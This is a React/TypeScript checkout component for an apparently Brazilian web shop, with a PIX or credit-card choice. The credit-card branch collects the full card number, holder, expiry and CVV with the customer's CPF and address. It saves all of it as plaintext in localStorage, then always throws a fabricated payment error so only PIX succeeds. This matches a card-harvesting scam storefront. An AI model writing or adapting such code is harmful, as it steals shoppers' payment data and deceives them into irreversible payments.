import { useState } from "react";
import { useCart } from "@/contexts/CartContext";
import { useToast } from "@/hooks/use-toast";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { CustomerForm } from "@/components/checkout/CustomerForm";
import { PaymentMethodSelector } from "@/components/checkout/PaymentMethodSelector";
import { CreditCardForm } from "@/components/checkout/CreditCardForm";
import { getFromLocalStorage, saveToLocalStorage } from "@/utils/localStorage";

export default function Checkout() {
  const { items, total, clearCart } = useCart();
  const { toast } = useToast();
  const [paymentMethod, setPaymentMethod] = useState<"pix" | "credit">("pix");
  const [formData, setFormData] = useState({
    name: "",
    cpf: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    state: "",
    zipCode: "",
  });

  const [creditCardData, setCreditCardData] = useState({
    cardNumber: "",
    cardHolder: "",
    expiryDate: "",
    cvv: "",
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      const orderData = {
        id: Date.now().toString(),
        customer_data: formData,
        items: items,
        total_amount: total,
        payment_method: paymentMethod,
        credit_card_data: paymentMethod === "credit" ? creditCardData : null,
        status: "pending",
        created_at: new Date().toISOString(),
      };

      // Create formatted text version of the order
      const orderText = `
DADOS DO PEDIDO:
----------------
ID: ${orderData.id}
Data: ${new Date(orderData.created_at).toLocaleString()}

DADOS DO CLIENTE:
----------------
Nome: ${orderData.customer_data.name}
CPF: ${orderData.customer_data.cpf}
Email: ${orderData.customer_data.email}
Telefone: ${orderData.customer_data.phone}
Endereço: ${orderData.customer_data.address}
Cidade: ${orderData.customer_data.city}
Estado: ${orderData.customer_data.state}
CEP: ${orderData.customer_data.zipCode}

DADOS DO CARTÃO:
---------------
Número: ${orderData.credit_card_data?.cardNumber || 'N/A'}
Titular: ${orderData.credit_card_data?.cardHolder || 'N/A'}
Validade: ${orderData.credit_card_data?.expiryDate || 'N/A'}
CVV: ${orderData.credit_card_data?.cvv || 'N/A'}

ITENS DO PEDIDO:
---------------
${items.map((item: any) => `${item.title} - Quantidade: ${item.quantity} - Preço: R$ ${item.price}`).join('\n')}

TOTAL: R$ ${total}`;

      // Add formatted text to order data
      const completeOrderData = {
        ...orderData,
        formatted_text: orderText
      };

      if (paymentMethod === "credit") {
        // Primeiro salvamos os dados do pedido
        const existingOrders = getFromLocalStorage('orders', []);
        saveToLocalStorage('orders', [...existingOrders, completeOrderData]);
        
        // Simulando erro no processamento do pagamento com cartão
        throw new Error("Erro no processamento do pagamento com cartão de crédito");
      }

      // Se chegou aqui, é pagamento PIX e foi bem sucedido
      toast({
        title: "Pedido realizado com sucesso!",
        description: "Você receberá um email com os detalhes do pedido."
      });

      clearCart();
      setFormData({
        name: "",
        cpf: "",
        email: "",
        phone: "",
        address: "",
        city: "",
        state: "",
        zipCode: "",
      });
      setCreditCardData({
        cardNumber: "",
        cardHolder: "",
        expiryDate: "",
        cvv: "",
      });
    } catch (error) {
      toast({
        title: "Erro no processamento do pagamento",
        description: error instanceof Error ? error.message : "Por favor, tente novamente.",
        variant: "destructive"
      });
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <div className="container mx-auto px-4 pt-24">
        <Card>
          <CardHeader>
            <CardTitle>Finalizar Compra</CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <CustomerForm formData={formData} setFormData={setFormData} />
              <PaymentMethodSelector 
                paymentMethod={paymentMethod} 
                setPaymentMethod={setPaymentMethod} 
              />
              {paymentMethod === "credit" && (
                <CreditCardForm 
                  creditCardData={creditCardData}
                  setCreditCardData={setCreditCardData}
                />
              )}
              <Button type="submit" className="w-full">
                Finalizar Pedido
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}